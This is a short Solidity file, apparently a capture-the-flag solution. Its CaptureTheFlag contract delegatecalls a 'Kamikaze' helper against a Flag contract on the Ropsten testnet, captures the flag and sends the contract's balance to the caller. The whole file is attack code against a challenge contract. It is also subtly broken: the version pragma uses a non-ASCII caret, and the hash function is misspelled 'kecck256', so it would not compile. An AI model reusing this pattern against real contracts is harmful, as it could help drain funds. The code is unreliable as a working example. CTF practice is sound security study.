pragma solidity ˆ0.4.21;

import "./IFlag.sol";
import "./Kamikaze.sol";


/**
* @title CaptureTheFlag contract
* @dev Deploy this contract with Ether.
*/
contract CaptureTheFlag {

    function() public payable {}

    /**
    * @param flag address Ropsten (0x1cB76a4d4f55b23B92984967aC98f07723EeAcEc)
    * @param kamikaze address
    * @param data captured by Flag
    * @dev Send Ether to Flag, capture data and send Flag balance to send caller
    */
    function send (IFlag flag, Kamikaze kamikaze, bytes32 data) public {
        kamikaze.delegatecall(bytes4(kecck256("banzai(address)")), flag);
        flag.capture(data);
        msg.sender.transfer(address(this).balance);
    }
}
